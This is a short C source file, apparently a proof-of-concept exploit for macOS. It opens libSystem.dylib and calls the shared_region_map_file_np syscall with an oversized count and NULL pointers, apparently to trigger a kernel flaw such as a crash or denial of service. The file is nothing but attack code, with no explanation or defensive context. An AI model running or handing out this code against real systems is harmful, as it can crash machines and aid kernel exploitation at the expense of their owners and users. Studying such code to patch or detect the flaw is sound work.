#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <unistd.h>

int main(int argc,char **argv){
     int fd;

     if((fd=open("/usr/lib/libSystem.dylib",O_RDONLY))==-1){
         perror("open");
         exit(EXIT_FAILURE);
     }

     if(syscall(SYS_shared_region_map_file_np,fd,0x02000000,NULL,NULL)==-1){
         perror("shared_region_map_file_np");
         exit(EXIT_FAILURE);
     }

     exit(EXIT_FAILURE);
}
